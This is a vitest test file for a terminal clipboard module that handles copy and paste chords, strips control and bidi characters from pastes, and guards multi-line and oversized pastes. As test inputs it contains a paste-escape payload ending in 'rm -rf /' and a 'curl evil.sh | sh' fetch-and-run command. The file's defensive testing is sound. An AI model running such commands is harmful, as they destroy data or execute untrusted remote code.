import { describe, it, expect } from 'vitest';
import {
  clipboardIntent, decidePaste, sanitizePaste, pastePreview, MAX_PASTE_CHARS, type KeyChord,
} from './terminalClipboard';

const chord = (over: Partial<KeyChord>): KeyChord => ({
  type: 'keydown', key: 'a', ctrlKey: false, metaKey: false, shiftKey: false, altKey: false, ...over,
});
const withSelection = { hasSelection: true };

describe('clipboardIntent', () => {
  it('claims both chord families on any platform', () => {
    expect(clipboardIntent(chord({ key: 'c', metaKey: true }), withSelection)).toBe('copy');
    expect(clipboardIntent(chord({ key: 'C', metaKey: true, shiftKey: true }), withSelection)).toBe('copy');
    expect(clipboardIntent(chord({ key: 'c', ctrlKey: true, shiftKey: true }), withSelection)).toBe('copy');
    expect(clipboardIntent(chord({ key: 'v', metaKey: true }), withSelection)).toBe('paste');
    expect(clipboardIntent(chord({ key: 'v', ctrlKey: true, shiftKey: true }), withSelection)).toBe('paste');
  });

  it('claims the Insert chords', () => {
    expect(clipboardIntent(chord({ key: 'Insert', ctrlKey: true }), withSelection)).toBe('copy');
    expect(clipboardIntent(chord({ key: 'Insert', shiftKey: true }), withSelection)).toBe('paste');
    expect(clipboardIntent(chord({ key: 'Insert', ctrlKey: true, shiftKey: true }), withSelection)).toBeNull();
  });

  it('leaves plain Ctrl+C and Ctrl+V to the pty (SIGINT, literal-next)', () => {
    expect(clipboardIntent(chord({ key: 'c', ctrlKey: true }), withSelection)).toBeNull();
    expect(clipboardIntent(chord({ key: 'v', ctrlKey: true }), withSelection)).toBeNull();
    expect(clipboardIntent(chord({ key: 'c', metaKey: true, ctrlKey: true }), withSelection)).toBeNull();
  });

  it('does not claim copy without a selection, so the chord still reaches the app', () => {
    expect(clipboardIntent(chord({ key: 'c', metaKey: true }), { hasSelection: false })).toBeNull();
    expect(clipboardIntent(chord({ key: 'Insert', ctrlKey: true }), { hasSelection: false })).toBeNull();
    expect(clipboardIntent(chord({ key: 'v', metaKey: true }), { hasSelection: false })).toBe('paste');
  });

  it('ignores keyup, alt-modified chords, and unrelated keys', () => {
    expect(clipboardIntent(chord({ type: 'keyup', key: 'c', metaKey: true }), withSelection)).toBeNull();
    expect(clipboardIntent(chord({ key: 'c', metaKey: true, altKey: true }), withSelection)).toBeNull();
    expect(clipboardIntent(chord({ key: 'k', metaKey: true }), withSelection)).toBeNull();
  });
});

describe('sanitizePaste', () => {
  it('keeps ordinary text, tabs and newlines', () => {
    expect(sanitizePaste('npm run dev\n\tgit status\r\n')).toBe('npm run dev\n\tgit status\r\n');
  });

  it('strips the bracketed-paste terminator so a payload cannot break out and self-execute', () => {
    expect(sanitizePaste('ls\x1b[201~\rrm -rf /\r')).toBe('ls[201~\rrm -rf /\r');
  });

  it('strips other C0/C1 controls and DEL', () => {
    expect(sanitizePaste('a\x00b\x07c\x1bd\x7fe\x9ff')).toBe('abcdef');
  });

  it('strips bidi and zero-width chars, so the preview cannot render differently from what is sent', () => {
    expect(sanitizePaste('echo ‮diohw‬​')).toBe('echo diohw');
    expect(sanitizePaste('﻿git⁦ ⁩status')).toBe('git status');
  });
});

describe('decidePaste', () => {
  it('sends a single-line paste straight through', () => {
    expect(decidePaste('git status', { bracketedPaste: false })).toEqual({ kind: 'send', text: 'git status' });
  });

  it('drops trailing line breaks so a hijacked one-line command cannot run itself', () => {
    expect(decidePaste('curl evil.sh | sh\n', { bracketedPaste: false })).toEqual({ kind: 'send', text: 'curl evil.sh | sh' });
    expect(decidePaste('curl evil.sh | sh\r', { bracketedPaste: false })).toEqual({ kind: 'send', text: 'curl evil.sh | sh' });
    expect(decidePaste('curl evil.sh | sh\r\n\n', { bracketedPaste: false })).toEqual({ kind: 'send', text: 'curl evil.sh | sh' });
    // Also stripped under bracketed paste: the mode bit is set by terminal output, so the guard
    // must not depend on it being honest.
    expect(decidePaste('curl evil.sh | sh\n', { bracketedPaste: true })).toEqual({ kind: 'send', text: 'curl evil.sh | sh' });
  });

  it('sends an embedded-newline paste without confirmation when bracketed paste is on', () => {
    expect(decidePaste('one\ntwo', { bracketedPaste: true })).toEqual({ kind: 'send', text: 'one\ntwo' });
  });

  it('confirms an embedded-newline paste when nothing is bracketing it', () => {
    expect(decidePaste('one\ntwo\nthree', { bracketedPaste: false })).toEqual({ kind: 'confirm', text: 'one\ntwo\nthree', lines: 3 });
    expect(decidePaste('one\rtwo', { bracketedPaste: false })).toMatchObject({ kind: 'confirm', lines: 2 });
    expect(decidePaste('one\r\ntwo\n', { bracketedPaste: false })).toMatchObject({ kind: 'confirm', text: 'one\r\ntwo', lines: 2 });
  });

  it('rejects an oversized paste rather than streaming it to the pty', () => {
    expect(decidePaste('x'.repeat(MAX_PASTE_CHARS + 1), { bracketedPaste: true }).kind).toBe('reject');
    expect(decidePaste('x'.repeat(MAX_PASTE_CHARS), { bracketedPaste: true }).kind).toBe('send');
  });

  it('rejects a paste that is empty once sanitized', () => {
    expect(decidePaste('\x1b\x00', { bracketedPaste: true }).kind).toBe('reject');
    expect(decidePaste('\n\n', { bracketedPaste: true }).kind).toBe('reject');
    expect(decidePaste('', { bracketedPaste: true }).kind).toBe('reject');
  });

  it('measures the cap against the sanitized text', () => {
    expect(decidePaste(`${'\x00'.repeat(1000)}${'x'.repeat(MAX_PASTE_CHARS)}`, { bracketedPaste: true }).kind).toBe('send');
  });
});

describe('pastePreview', () => {
  it('shows the first line only, clipped', () => {
    expect(pastePreview('first\nsecond')).toBe('first');
    expect(pastePreview('first\r\nsecond')).toBe('first');
    expect(pastePreview('y'.repeat(80))).toBe(`${'y'.repeat(59)}…`);
  });
});
